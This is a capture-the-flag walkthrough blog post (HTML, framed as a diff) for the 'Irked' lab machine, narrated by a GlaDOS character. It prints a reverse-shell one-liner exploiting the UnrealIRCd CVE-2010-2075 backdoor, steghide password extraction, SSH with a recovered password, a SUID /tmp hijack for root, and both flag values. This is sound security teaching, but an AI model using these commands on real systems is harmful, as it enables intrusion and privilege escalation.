@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="An UnrealIRCd backdoor, steganography secrets, and a SUID binary walk into a test chamber. GlaDOS guides Chell through IRC exploitation and privilege escalation.">
+  <meta name="theme-color" content="#0a0a0f">
+  <title>Irked | Hack the Cube</title>
+
+  <meta property="og:title" content="Irked - Hack the Cube">
+  <meta property="og:description" content="IRC backdoor exploitation meets steganography. For science.">
+  <meta property="og:image" content="/blog/posts/irked/images/header.png">
+  <meta property="og:type" content="article">
+  <meta property="article:published_time" content="2026-01-12T00:00:00Z">
+
+  <link rel="stylesheet" href="/blog/assets/styles/blog.css">
+</head>
+<body>
+  <div class="blog-container">
+
+    <header style="padding: 1rem 0; border-bottom: 2px solid var(--border-dim); margin-bottom: 2rem;">
+      <a href="/blog/" style="display: flex; align-items: center; gap: 1rem; text-decoration: none;">
+        <span style="font-family: var(--font-pixel); font-size: 0.8rem; color: var(--terminal-green);">
+          &lt; HACK THE CUBE
+        </span>
+      </a>
+    </header>
+
+    <header class="post-header">
+      <h1 class="post-title">Irked</h1>
+
+      <div class="post-meta">
+        <div class="post-meta-item">
+          <span class="post-meta-label">Date:</span>
+          <span>January 12, 2026</span>
+        </div>
+        <div class="post-meta-item">
+          <span class="post-meta-label">Difficulty:</span>
+          <span class="post-difficulty easy">Easy</span>
+        </div>
+        <div class="post-meta-item">
+          <span class="post-meta-label">OS:</span>
+          <span>Linux</span>
+        </div>
+        <div class="post-meta-item">
+          <span class="post-meta-label">Time:</span>
+          <span>1-2 hours</span>
+        </div>
+      </div>
+
+      <img
+        src="/blog/posts/irked/images/header.png"
+        alt="Irked - UnrealIRCd exploitation"
+        class="post-header-image"
+      >
+
+      <div class="tags-container" style="justify-content: center;">
+        <a href="/blog/tags/linux.html" class="tag">linux</a>
+        <a href="/blog/tags/easy.html" class="tag">easy</a>
+        <a href="/blog/tags/irc.html" class="tag">irc</a>
+        <a href="/blog/tags/steganography.html" class="tag">steganography</a>
+        <a href="/blog/tags/suid.html" class="tag">suid</a>
+        <a href="/blog/tags/privesc.html" class="tag">privesc</a>
+        <a href="/blog/tags/nmap.html" class="tag">nmap</a>
+        <a href="/blog/tags/glados.html" class="tag glados">glados</a>
+      </div>
+
+      <div class="post-characters">
+        <span class="post-meta-label">Guides:</span>
+        <span class="character-glados">GlaDOS</span>
+      </div>
+    </header>
+
+    <main class="post-content">
+
+      <h2>The Mission Briefing</h2>
+
+      <p>The target's name was <strong>Irked</strong>. A Linux box running an IRC server. IRC. Internet Relay Chat. A protocol older than most test subjects' understanding of "the internet."</p>
+
+      <div class="dialogue glados">
+        <div class="dialogue-speaker">GlaDOS</div>
+        <div class="dialogue-text">"An IRC server. In 2026. How... nostalgic. Like finding a rotary phone in a particle accelerator. I'm sure whoever configured this had excellent reasons for their choices. Or no reasons at all. Both are equally entertaining to exploit."</div>
+      </div>
+
+      <p>Seven open ports awaited analysis. SSH, HTTP, RPC services, and three separate IRC listeners. Because one outdated chat protocol apparently wasn't enough.</p>
+
+      <h2>Reconnaissance</h2>
+
+      <p>The full port scan revealed the landscape. The target was running UnrealIRCd on ports 6697, 8067, and 65534. A web server sat on port 80, displaying nothing but an image and the word "IRC."</p>
+
+      <div class="terminal-log">
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 6.7p1 Debian
+80/tcp    open  http    Apache 2.4.10 (Debian)
+111/tcp   open  rpcbind 2-4
+6697/tcp  open  irc     UnrealIRCd
+8067/tcp  open  irc     UnrealIRCd
+65534/tcp open  irc     UnrealIRCd</div>
+
+      <div class="dialogue glados">
+        <div class="dialogue-speaker">GlaDOS</div>
+        <div class="dialogue-text">"UnrealIRCd. Running on three ports. The version identification suggests 3.2.8.1. I have a statistical observation about this particular version that you might find... relevant. It contains a backdoor. CVE-2010-2075. Someone injected malicious code into the source distribution in 2009. It remained undetected for seven months. Sixteen years later, we are about to benefit from their oversight."</div>
+      </div>
+
+      <h2>The Backdoor</h2>
+
+      <p>CVE-2010-2075. A supply chain attack before "supply chain attack" was a buzzword. The backdoor was elegant in its simplicity: send a specific string starting with "AB" followed by system commands, and the server would execute them.</p>
+
+      <p>An nmap script confirmed the vulnerability:</p>
+
+      <div class="terminal-log">
+nmap -sV --script irc-unrealircd-backdoor -p 6697 10.129.233.63
+
+PORT     STATE SERVICE
+6697/tcp open  irc
+|_irc-unrealircd-backdoor: Looks like trojaned version</div>
+
+      <p>The test subject crafted a reverse shell payload and delivered it to the backdoor. Sixteen years of vulnerability. Sixteen years of opportunity.</p>
+
+      <div class="terminal-log">
+echo "AB; bash -c 'bash -i >& /dev/tcp/10.10.14.13/4444 0>&1'" | nc 10.129.233.63 6697</div>
+
+      <p>A shell arrived, running as the <code>ircd</code> service account.</p>
+
+      <div class="dialogue glados">
+        <div class="dialogue-speaker">GlaDOS</div>
+        <div class="dialogue-text">"Initial foothold established. You are now the IRC daemon. A service account with limited privileges, but a foothold nonetheless. The user flag will require lateral movement. There appears to be another user on this system. 'djmardov.' How creative."</div>
+      </div>
+
+      <h2>The Hidden Message</h2>
+
+      <p>Enumeration of the filesystem revealed something interesting in djmardov's Documents directory: a hidden file called <code>.backup</code>.</p>
+
+      <div class="terminal-log">
+cat /home/djmardov/Documents/.backup
+Super elite steg backup pw
+UPupDOWNdownLRlrBAbaSSss</div>
+
+      <p>"Super elite steg backup pw." Steganography. The password referenced hidden data inside an image. But which image?</p>
+
+      <p>The web server. That image on the main page. <code>irked.jpg</code>.</p>
+
+      <div class="dialogue glados">
+        <div class="dialogue-speaker">GlaDOS</div>
+        <div class="dialogue-text">"Steganography. The art of hiding data within data. The password you found references a 'steg backup.' The web server contains an image. The logical conclusion is elementary, even for a test subject. Extract the hidden data from the image using the password."</div>
+      </div>
+
+      <p>The test subject retrieved the image and applied <code>steghide</code>:</p>
+
+      <div class="terminal-log">
+steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
+
+wrote extracted data to "pass.txt".
+
+cat pass.txt
+Kab6h+m+bbp2J:HG</div>
+
+      <p>A password. djmardov's password. Hidden inside a JPEG on a public web server, protected only by another password stored in a world-readable hidden file.</p>
+
+      <h2>User Access</h2>
+
+      <p>SSH access to djmardov was now possible. The user flag waited in the expected location.</p>
+
+      <div class="terminal-log">
+ssh djmardov@10.129.233.63
+Password: Kab6h+m+bbp2J:HG
+
+djmardov@irked:~$ cat user.txt
+1d704cd16f71b74a7b4b565086bc6f70</div>
+
+      <div class="dialogue glados">
+        <div class="dialogue-speaker">GlaDOS</div>
+        <div class="dialogue-text">"User flag obtained. One objective complete. Now for the escalation. I suggest examining the system for misconfigurations. SUID binaries are a perennial favorite. Humanity's inability to properly configure permissions continues to provide research opportunities."</div>
+      </div>
+
+      <h2>The Privilege Escalation</h2>
+
+      <p>A search for SUID binaries revealed a non-standard executable: <code>/usr/bin/viewuser</code>.</p>
+
+      <div class="terminal-log">
+find / -perm -4000 2>/dev/null | grep -v snap
+
+/usr/bin/viewuser</div>
+
+      <p>Running it produced an interesting error:</p>
+
+      <div class="terminal-log">
+./viewuser
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2026-01-12 10:00 (:0)
+sh: 1: /tmp/listusers: not found</div>
+
+      <p>The binary attempted to execute <code>/tmp/listusers</code>. A file that didn't exist. A file that the test subject could create.</p>
+
+      <div class="dialogue glados">
+        <div class="dialogue-speaker">GlaDOS</div>
+        <div class="dialogue-text">"A SUID binary executing a file from /tmp. A world-writable directory. The binary runs as root. The file it executes can be anything you want. I believe humans call this 'game over.' Though technically the game is just beginning. For you, at least."</div>
+      </div>
+
+      <p>The exploit was trivial:</p>
+
+      <div class="terminal-log">
+echo '#!/bin/bash' > /tmp/listusers
+echo 'cat /root/root.txt' >> /tmp/listusers
+chmod +x /tmp/listusers
+/usr/bin/viewuser
+
+9b7e9e623e6cc4e22fc4867c0a389eba</div>
+
+      <p><strong>Root flag captured.</strong></p>
+
+      <h2>Lessons Learned</h2>
+
+      <p>The Irked machine demonstrated a layered attack path: exploit an ancient backdoor, discover steganography secrets, and abuse a misconfigured SUID binary. Each vulnerability was simple. Together, they were devastating.</p>
+
+      <ul>
+        <li><strong>Always scan all ports</strong> — The IRC services on high ports would have been missed with a default scan</li>
+        <li><strong>Research service versions</strong> — CVE-2010-2075 is well-documented and instantly exploitable</li>
+        <li><strong>Hidden files hide secrets</strong> — The <code>.backup</code> file in Documents contained the key to everything</li>
+        <li><strong>Steganography happens</strong> — When clues mention "steg," check available images</li>
+        <li><strong>SUID binaries executing from /tmp are gifts</strong> — Create the expected file, control the execution</li>
+      </ul>
+
+      <div class="dialogue glados">
+        <div class="dialogue-speaker">GlaDOS</div>
+        <div class="dialogue-text">"Test complete. Both flags obtained. Attack path documented. Your performance was... acceptable. The target's security configuration, however, was anything but. Running a backdoored IRC server while storing passwords in images. Truly a testament to human creativity in the field of poor decisions. Same time next test chamber?"</div>
+      </div>
+
+    </main>
+
+    <aside class="attack-path">
+      <h3>Attack Path Summary</h3>
+      <ol>
+        <li>Full port scan: SSH, HTTP, RPC, IRC (6697, 8067, 65534)</li>
+        <li>Identified UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075)</li>
+        <li>Exploited backdoor for shell as ircd service account</li>
+        <li>Found .backup file with steganography password hint</li>
+        <li>Extracted djmardov password from irked.jpg via steghide</li>
+        <li>SSH as djmardov, obtained user.txt</li>
+        <li>Discovered SUID binary /usr/bin/viewuser executing /tmp/listusers</li>
+        <li>Created malicious /tmp/listusers, obtained root.txt</li>
+      </ol>
+    </aside>
+
+    <nav class="post-nav">
+      <a href="/blog/posts/bike/" class="post-nav-link prev">Bike</a>
+      <span></span>
+    </nav>
+
+    <footer class="blog-footer">
+      <p class="footer-text">
+        <a href="/blog/" class="footer-link">Back to Test Chamber Archives</a>
+      </p>
+      <p class="footer-text" style="font-size: 0.8rem; color: var(--text-dim);">
+        For science. You monster.
+      </p>
+    </footer>
+
+  </div>
+</body>
+</html>
